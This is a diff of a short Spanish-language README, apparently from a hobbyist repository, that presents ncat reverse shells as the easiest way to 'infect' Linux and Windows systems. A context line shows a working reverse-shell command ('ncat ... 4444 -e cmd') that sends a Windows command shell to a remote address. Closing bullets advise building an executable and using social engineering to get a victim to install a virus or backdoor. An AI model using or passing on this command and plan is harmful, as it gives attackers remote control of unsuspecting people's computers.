@@ -1,6 +1,6 @@
 # REVERSE_SHELL-CON-NCAT
 
-# Aqui te muestro la manera mas sencilla de infectar un sistema linux y windows.
+# Infectar un sistema linux y windows.
 # Con tan solo 2 lineas de comando !
 
 
@@ -39,7 +39,7 @@ ncat -v 192.168.1.200 4444 -e cmd
 
 
 
-# " La Navaja Suiza " ( es por algo que lo llaman de esta manera)
+# " La Navaja Suiza " EN ACCION !
 
 
 
@@ -52,5 +52,4 @@ ncat -v 192.168.1.200 4444 -e cmd
 * Tenemos que usar un lenguaje y escribir nuestro codigo y crear un archivo executable tanto en linux como en windows.
 * Y usar ingenieria social para hacer que esa persona instale nuestro virus, backdoor..etc.
 
-# Ire actualizando el repo.
-# TmCyber
+
